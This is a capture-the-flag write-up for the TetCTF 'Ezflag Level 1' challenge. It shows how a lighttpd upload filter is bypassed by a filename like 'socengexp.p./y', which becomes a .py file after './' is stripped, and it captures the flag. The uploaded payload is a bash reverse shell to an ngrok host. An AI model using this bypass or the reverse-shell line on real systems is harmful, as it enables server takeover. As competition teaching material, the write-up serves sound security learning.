# Ezflag Level 1

This was a file upload vulnerability. Looking inside the `lighttpd.conf` file, we could see that any `.py` files are run with `/usr/bin/python3`.

```
alias.url += ( "/cgi-bin" => "/var/www/cgi-bin" )
alias.url += ( "/uploads" => "/var/www/upload" )
cgi.assign = ( ".py" => "/usr/bin/python3" )
```

Validation is performed to check for the `.py` extension.

```python
def valid_file_name(name) -> bool:
    if len(name) == 0 or name[0] == '/':
        return False
    if '..' in name:
        return False
    if '.py' in name:
        return False
    return True
```

However, once validated, a replacement of `./` with an empty string is performed.

```python
normalized_name = item.filename.strip().replace('./', '')
```

Thus, we can bypass the `.py` filter by using `./py`.

```http
Content-Disposition: form-data; name="file"; filename="socengexp.p./y"
Content-Type: text/x-python-script

import os

os.system('bash -c "bash -i >& /dev/tcp/2.tcp.ngrok.io/15273 0>&1"')
```

This allows us to get a reverse shell.

```
www-data@48b6db5957ed:/$ cat flag
cat flag
TetCTF{65e95f4eacc1fe7010616e051f1c610a}
```
